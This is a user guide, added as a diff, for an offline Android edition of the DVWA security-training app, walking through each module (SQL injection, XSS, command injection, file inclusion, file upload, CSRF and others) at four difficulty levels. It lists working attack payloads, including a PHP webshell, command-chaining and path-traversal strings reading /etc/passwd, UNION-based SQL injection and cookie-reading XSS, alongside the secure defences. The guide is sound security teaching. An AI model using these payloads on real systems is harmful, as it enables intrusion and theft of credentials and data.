@@ -1,0 +1,168 @@
+<h2><font color='#1B5E20'>DVWA Offline – User Guide</font></h2>
+<h3><font color='#1B5E20'>1. What is DVWA?</font></h3>
+<p>DVWA (Damn Vulnerable Web Application) is a practice app that is <strong>vulnerable on purpose</strong>. You use it to learn how common web attacks work (SQL Injection, XSS, CSRF and more) and how good code stops them.</p>
+<ul>
+<li>This Android edition is <strong>fully native and offline</strong>: no WebView, no internet permission, no web server. Every "attack" only touches the app's own private data.</li>
+<li><strong>Legal use only:</strong> practise here, or on systems you own or have written permission to test. Never try these payloads on real websites.</li>
+<li>XSS, CSP Bypass and JavaScript Attacks are <strong>simulated natively</strong>: there is no browser engine, so the app analyses the output and shows "⚠ XSS fired" with a simulated alert dialog instead of running real JavaScript.</li>
+</ul>
+<h3><font color='#1B5E20'>2. Logging in</font></h3>
+<ul>
+<li>Default login: <tt><font color='#B71C1C'>admin</font></tt> / <tt><font color='#B71C1C'>password</font></tt></li>
+<li>Other accounts: <tt><font color='#B71C1C'>gordonb</font></tt> / <tt><font color='#B71C1C'>abc123</font></tt>, <tt><font color='#B71C1C'>1337</font></tt> / <tt><font color='#B71C1C'>charley</font></tt>, <tt><font color='#B71C1C'>pablo</font></tt> / <tt><font color='#B71C1C'>letmein</font></tt>, <tt><font color='#B71C1C'>smithy</font></tt> / <tt><font color='#B71C1C'>password</font></tt></li>
+<li>Use <strong>Logout</strong> (menu ☰ or the ⋮ toolbar menu) to switch user. Some modules (for example Authorisation Bypass) need a non-admin user.</li>
+<li>Change the app language any time: the 🌐 button on the login screen, <strong>Language</strong> in the drawer under Settings, or the ⋮ menu.</li>
+</ul>
+<h3><font color='#1B5E20'>3. Setup / Reset DB</font></h3>
+<ul>
+<li>Open the menu ☰ → <strong>Setup / Reset DB</strong> → press <strong>Create / Reset Database</strong>.</li>
+<li>This restores the 5 users and their passwords, empties the guestbook, deletes uploaded files and clears session data.</li>
+<li>Use it whenever you changed a password (CSRF, CAPTCHA) and cannot log in, or when Stored XSS entries make the guestbook messy.</li>
+</ul>
+<h3><font color='#1B5E20'>4. Security levels</font></h3>
+<p>Open ☰ → <strong>DVWA Security</strong>, pick a level and press <strong>Submit</strong>. The level badge on every module shows the current level.</p>
+<ul>
+<li><strong>Low</strong> – no protection at all. Best for learning the basic attack.</li>
+<li><strong>Medium</strong> – the developer tried to protect the code but made mistakes (weak filters, blacklists).</li>
+<li><strong>High</strong> – harder or unusual protections, like a CTF challenge. Some attacks need a trick.</li>
+<li><strong>Impossible</strong> – the secure version. Compare its source code with the other levels to learn the right defence.</li>
+</ul>
+<p>Tip: start every module on Low, then move up one level at a time.</p>
+<h3><font color='#1B5E20'>5. Tools on every module screen</font></h3>
+<ul>
+<li><strong>View Source</strong> – shows the real DVWA PHP code for the current level. Tabs switch between Low / Medium / High / Impossible. The code itself is never translated.</li>
+<li><strong>Compare All</strong> – all four levels one after another, so you can spot what changed.</li>
+<li><strong>View Help</strong> – explains the vulnerability, the goal, and hints (spoilers in red) for each level, in your chosen language.</li>
+<li><strong>🛠 Intercept &amp; tamper panel</strong> (orange, tap to open) – the native replacement for Burp Suite / browser DevTools. Here you edit hidden form fields, <tt><font color='#B71C1C'>user_token</font></tt>, headers (Referer, User-Agent), cookies, file names, Content-Type and client-side limits like maxlength.</li>
+<li><strong>Go to URL… bar</strong> (⋮ toolbar menu) – a simulated address bar. Type a DVWA path such as <tt><font color='#B71C1C'>/vulnerabilities/authbypass/</font></tt> or <tt><font color='#B71C1C'>/vulnerabilities/sqli/</font></tt> to open that page directly.</li>
+<li><strong>Brute Force wordlist runner</strong> – in the Brute Force module, the "Attack helper" card tries every password in your list (one per line) against the login, like Burp Intruder, and stops at the first success.</li>
+</ul>
+<h3><font color='#1B5E20'>6. Module walkthroughs</font></h3>
+<h4><font color='#E65100'>Brute Force</font></h4>
+<ul>
+<li><strong>Try:</strong> username <tt><font color='#B71C1C'>admin</font></tt>, then run the Attack helper with a short wordlist.</li>
+<li><strong>Example:</strong> wordlist containing <tt><font color='#B71C1C'>123456</font></tt>, <tt><font color='#B71C1C'>letmein</font></tt>, <tt><font color='#B71C1C'>password</font></tt>.</li>
+<li><strong>Success:</strong> "Welcome to the password protected area admin" with the user's avatar.</li>
+<li><strong>Impossible defends</strong> with a CSRF token, a random delay and an account lock after 3 failed logins.</li>
+</ul>
+<h4><font color='#E65100'>Command Injection</font></h4>
+<ul>
+<li><strong>Try:</strong> chain a second command after the IP address.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>127.0.0.1; cat /etc/passwd</font></tt> (Low), <tt><font color='#B71C1C'>127.0.0.1 | whoami</font></tt> (Medium/High).</li>
+<li><strong>Success:</strong> the output shows the command result (from a simulated Debian shell; nothing runs on your phone).</li>
+<li><strong>Impossible defends</strong> by accepting only four numeric parts of an IP address.</li>
+</ul>
+<h4><font color='#E65100'>CSRF</font></h4>
+<ul>
+<li><strong>Try:</strong> use the "Attacker: forged link" card so the logged-in victim opens a URL that changes the password.</li>
+<li><strong>Example:</strong> <tt><font color='#B71C1C'>http://127.0.0.1/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change</font></tt></li>
+<li><strong>Success:</strong> "⚠ CSRF succeeded — the victim's password was changed". Log in again with the new password or reset the DB.</li>
+<li><strong>Impossible defends</strong> with an anti-CSRF token plus the current password.</li>
+</ul>
+<h4><font color='#E65100'>File Inclusion</font></h4>
+<ul>
+<li><strong>Try:</strong> change the <tt><font color='#B71C1C'>?page=</font></tt> value to read other files.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>../../../../../etc/passwd</font></tt> (Low), <tt><font color='#B71C1C'>....//....//....//etc/passwd</font></tt> (Medium), <tt><font color='#B71C1C'>file:///etc/passwd</font></tt> (High).</li>
+<li><strong>Success:</strong> the file content appears, e.g. the hidden quotes from <tt><font color='#B71C1C'>../../hackable/flags/fi.php</font></tt>.</li>
+<li><strong>Impossible defends</strong> with a fixed allow-list of file names.</li>
+</ul>
+<h4><font color='#E65100'>File Upload</font></h4>
+<ul>
+<li><strong>Try:</strong> upload a PHP webshell instead of an image, then request it.</li>
+<li><strong>Example:</strong> file body <tt><font color='#B71C1C'>&lt;?php system($_GET['cmd']); ?&gt;</font></tt> saved as <tt><font color='#B71C1C'>shell.php</font></tt>, then request <tt><font color='#B71C1C'>/hackable/uploads/shell.php?cmd=id</font></tt>.</li>
+<li><strong>Success:</strong> "⚠ Server executed shell.php as PHP". On Medium change Content-Type to <tt><font color='#B71C1C'>image/png</font></tt> in the tamper panel; on High add the GIF89a magic bytes and use File Inclusion.</li>
+<li><strong>Impossible defends</strong> by checking extension, type and real image content, then re-encoding and renaming the file.</li>
+</ul>
+<h4><font color='#E65100'>Insecure CAPTCHA</font></h4>
+<ul>
+<li><strong>Try:</strong> skip the CAPTCHA step by editing the hidden fields in the tamper panel.</li>
+<li><strong>Example:</strong> on Low set <tt><font color='#B71C1C'>step</font></tt> to <tt><font color='#B71C1C'>2</font></tt>; on Medium also set <tt><font color='#B71C1C'>passed_captcha</font></tt> to <tt><font color='#B71C1C'>true</font></tt>; on High use User-Agent <tt><font color='#B71C1C'>reCAPTCHA</font></tt> and response <tt><font color='#B71C1C'>hidd3n_valu3</font></tt>.</li>
+<li><strong>Success:</strong> "Password Changed." without solving the CAPTCHA.</li>
+<li><strong>Impossible defends</strong> by checking the CAPTCHA, a token and the current password in one request.</li>
+</ul>
+<h4><font color='#E65100'>SQL Injection</font></h4>
+<ul>
+<li><strong>Try:</strong> break out of the SQL query to read other rows and tables.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>1' OR '1'='1</font></tt> and <tt><font color='#B71C1C'>1' UNION SELECT user, password FROM users#</font></tt> (Low); <tt><font color='#B71C1C'>1 UNION SELECT user, password FROM users</font></tt> in the tamper override (Medium).</li>
+<li><strong>Success:</strong> all users and their password hashes are listed.</li>
+<li><strong>Impossible defends</strong> with prepared statements (parameterised queries).</li>
+</ul>
+<h4><font color='#E65100'>SQL Injection (Blind)</font></h4>
+<ul>
+<li><strong>Try:</strong> ask true/false questions, because the page only says "exists" or "MISSING".</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>1' AND 1=1#</font></tt> (exists) vs <tt><font color='#B71C1C'>1' AND 1=2#</font></tt> (missing); time-based <tt><font color='#B71C1C'>1' AND sleep(3)#</font></tt>.</li>
+<li><strong>Success:</strong> you can tell true from false by the message or by the response time shown.</li>
+<li><strong>Impossible defends</strong> with prepared statements and a numeric check.</li>
+</ul>
+<h4><font color='#E65100'>Weak Session IDs</font></h4>
+<ul>
+<li><strong>Try:</strong> press Generate several times and look at the <tt><font color='#B71C1C'>dvwaSession</font></tt> values.</li>
+<li><strong>Example:</strong> Low counts 1, 2, 3…; Medium is the current time; High is md5 of a counter.</li>
+<li><strong>Success:</strong> you can predict the next session ID.</li>
+<li><strong>Impossible defends</strong> with a random, hashed value and Secure/HttpOnly cookie flags.</li>
+</ul>
+<h4><font color='#E65100'>XSS (DOM)</font></h4>
+<ul>
+<li><strong>Try:</strong> edit the address bar URL after <tt><font color='#B71C1C'>default=</font></tt>.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>?default=&lt;script&gt;alert(1)&lt;/script&gt;</font></tt> (Low); <tt><font color='#B71C1C'>?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</font></tt> (Medium); <tt><font color='#B71C1C'>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</font></tt> (High).</li>
+<li><strong>Success:</strong> "⚠ XSS fired" and a simulated alert dialog.</li>
+<li><strong>Impossible defends</strong> by not decoding the input, so it is never parsed as HTML.</li>
+</ul>
+<h4><font color='#E65100'>XSS (Reflected)</font></h4>
+<ul>
+<li><strong>Try:</strong> put HTML/JavaScript in the name field.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</font></tt> (Low); <tt><font color='#B71C1C'>&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</font></tt> (Medium); <tt><font color='#B71C1C'>&lt;img src=x onerror=alert(1)&gt;</font></tt> (High).</li>
+<li><strong>Success:</strong> "⚠ XSS fired" with your alert text.</li>
+<li><strong>Impossible defends</strong> with htmlspecialchars() output encoding and a token.</li>
+</ul>
+<h4><font color='#E65100'>XSS (Stored)</font></h4>
+<ul>
+<li><strong>Try:</strong> sign the guestbook with a payload so every visitor runs it.</li>
+<li><strong>Examples:</strong> message <tt><font color='#B71C1C'>&lt;script&gt;alert(1)&lt;/script&gt;</font></tt> (Low); name <tt><font color='#B71C1C'>&lt;svg onload=alert(1)&gt;</font></tt> after ticking "Remove client-side maxlength" (Medium/High).</li>
+<li><strong>Success:</strong> the guestbook verdict shows "⚠ XSS fired". Use Clear Guestbook or Reset DB to clean up.</li>
+<li><strong>Impossible defends</strong> by encoding both fields and using a prepared statement.</li>
+</ul>
+<h4><font color='#E65100'>CSP Bypass</font></h4>
+<ul>
+<li><strong>Try:</strong> load a script from a source the Content Security Policy wrongly allows.</li>
+<li><strong>Examples:</strong> Low: include <tt><font color='#B71C1C'>https://pastebin.com/raw/…</font></tt> with simulated content <tt><font color='#B71C1C'>alert(1)</font></tt>; Medium: <tt><font color='#B71C1C'>&lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="&gt;alert(1)&lt;/script&gt;</font></tt>; High: change the JSONP callback, e.g. <tt><font color='#B71C1C'>source/jsonp.php?callback=alert(document.cookie)//</font></tt>.</li>
+<li><strong>Success:</strong> "⚠ CSP allowed the script — it executes (simulated)". Nothing is downloaded.</li>
+<li><strong>Impossible defends</strong> with a hard-coded callback.</li>
+</ul>
+<h4><font color='#E65100'>JavaScript Attacks</font></h4>
+<ul>
+<li><strong>Try:</strong> submit the word <tt><font color='#B71C1C'>success</font></tt> with a valid token.</li>
+<li><strong>Example:</strong> type <tt><font color='#B71C1C'>success</font></tt>, open the tamper panel and press the console helper (e.g. <tt><font color='#B71C1C'>generate_token()</font></tt>) so the hidden token matches, then Submit.</li>
+<li><strong>Success:</strong> "Well done!".</li>
+<li><strong>Impossible:</strong> there is no real defence – anything on the client can be changed. That is the lesson.</li>
+</ul>
+<h4><font color='#E65100'>Authorisation Bypass</font></h4>
+<ul>
+<li><strong>Try:</strong> log in as <tt><font color='#B71C1C'>gordonb</font></tt> / <tt><font color='#B71C1C'>abc123</font></tt> and still use the admin-only user manager.</li>
+<li><strong>Example:</strong> Low: open the page from the menu or Go to URL <tt><font color='#B71C1C'>/vulnerabilities/authbypass/</font></tt>; Medium/High: use the API console to POST <tt><font color='#B71C1C'>{"id":2,"first_name":"Hacked","surname":"ByGordon"}</font></tt>.</li>
+<li><strong>Success:</strong> "User updated" even though you are not admin.</li>
+<li><strong>Impossible defends</strong> by checking the user's role on every API call.</li>
+</ul>
+<h4><font color='#E65100'>Open HTTP Redirect</font></h4>
+<ul>
+<li><strong>Try:</strong> change the <tt><font color='#B71C1C'>redirect=</font></tt> value so a trusted link sends the victim elsewhere.</li>
+<li><strong>Examples:</strong> <tt><font color='#B71C1C'>?redirect=https://example.com</font></tt> (Low); <tt><font color='#B71C1C'>?redirect=//example.com</font></tt> (Medium); <tt><font color='#B71C1C'>?redirect=https://example.com/?a=info.php</font></tt> (High).</li>
+<li><strong>Success:</strong> "⚠ Open redirect…" – the target is shown, never opened.</li>
+<li><strong>Impossible defends</strong> by mapping numeric IDs to fixed pages.</li>
+</ul>
+<h4><font color='#E65100'>Cryptography Problems</font></h4>
+<ul>
+<li><strong>Low:</strong> the "secret" is XOR + Base64. Decode the intercepted message and log in with the password inside it.</li>
+<li><strong>Medium:</strong> the session token uses AES-ECB. Swap 16-byte (32 hex) blocks between tokens to build a valid admin token for Sweep.</li>
+<li><strong>High:</strong> a padding-oracle attack on AES-CBC: tamper the token/IV and watch the error messages.</li>
+<li><strong>Impossible defends</strong> with AES-GCM (authenticated encryption), so any change is rejected.</li>
+</ul>
+<h3><font color='#1B5E20'>7. Troubleshooting</font></h3>
+<ul>
+<li><strong>Cannot log in after a CSRF/CAPTCHA test:</strong> the password was changed. Use the new password, or reinstall – or log in as another user and run Setup / Reset DB.</li>
+<li><strong>Strange data or errors in a module:</strong> run ☰ → Setup / Reset DB.</li>
+<li><strong>Nothing happens on an XSS payload:</strong> check the level (higher levels filter more) and read View Help. Remember the effect is simulated.</li>
+<li><strong>Wrong language:</strong> change it from the 🌐 Language option. On Android 13+ you can also use Settings → Apps → DVWA Offline → Language.</li>
+<li><strong>App still broken:</strong> uninstall and reinstall the APK – all data is stored only inside the app.</li>
+<li><strong>Tutorial again:</strong> ☰ → Tutorial (first-run slides).</li>
+</ul>
